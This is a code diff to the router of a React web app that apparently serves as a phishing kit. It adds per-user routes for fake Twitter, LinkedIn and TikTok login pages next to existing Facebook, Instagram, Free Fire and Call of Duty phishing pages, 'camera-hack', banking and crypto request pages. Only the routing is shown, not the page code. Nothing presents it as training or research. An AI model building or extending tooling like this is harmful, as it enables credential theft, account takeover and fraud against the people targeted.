@@ -13,7 +13,8 @@ import TopUp from "./pages/TopUp";
 import Inbox from "./pages/Inbox";
 import Phishing from "./pages/Phishing";
 import CameraHack from "./pages/CameraHack";
-import VideoSimulation from "./pages/VideoSimulation";
+import DownloadersTools from "./pages/DownloadersTools";
+import GPT from "./pages/GPT";
 import BankingRequest from "./pages/BankingRequest";
 import CryptoRequest from "./pages/CryptoRequest";
 import Admin from "./pages/Admin";
@@ -23,6 +24,9 @@ import NotFoundError from "./pages/NotFoundError";
 // Phishing Pages
 import FacebookPhishing from "./pages/phishing/Facebook";
 import InstagramPhishing from "./pages/phishing/Instagram";
+import TwitterPhishing from "./pages/phishing/Twitter";
+import LinkedInPhishing from "./pages/phishing/LinkedIn";
+import TikTokPhishing from "./pages/phishing/TikTok";
 import FreeFirePhishing from "./pages/phishing/FreeFire";
 import CallOfDutyPhishing from "./pages/phishing/CallOfDuty";
 
@@ -50,7 +54,8 @@ const App = () => (
           <Route path="/inbox" element={<Inbox />} />
           <Route path="/phishing" element={<Phishing />} />
           <Route path="/camera-hack" element={<CameraHack />} />
-          <Route path="/video-simulation" element={<VideoSimulation />} />
+          <Route path="/downloaders-tools" element={<DownloadersTools />} />
+          <Route path="/gpt" element={<GPT />} />
           <Route path="/banking-request" element={<BankingRequest />} />
           <Route path="/crypto-request" element={<CryptoRequest />} />
           <Route path="/admin" element={<Admin />} />
@@ -58,6 +63,9 @@ const App = () => (
           {/* Phishing Pages */}
           <Route path="/phishing/facebook/:userId" element={<FacebookPhishing />} />
           <Route path="/phishing/instagram/:userId" element={<InstagramPhishing />} />
+          <Route path="/phishing/twitter/:userId" element={<TwitterPhishing />} />
+          <Route path="/phishing/linkedin/:userId" element={<LinkedInPhishing />} />
+          <Route path="/phishing/tiktok/:userId" element={<TikTokPhishing />} />
           <Route path="/phishing/freefire/:userId" element={<FreeFirePhishing />} />
           <Route path="/phishing/callofduty/:userId" element={<CallOfDutyPhishing />} />
           
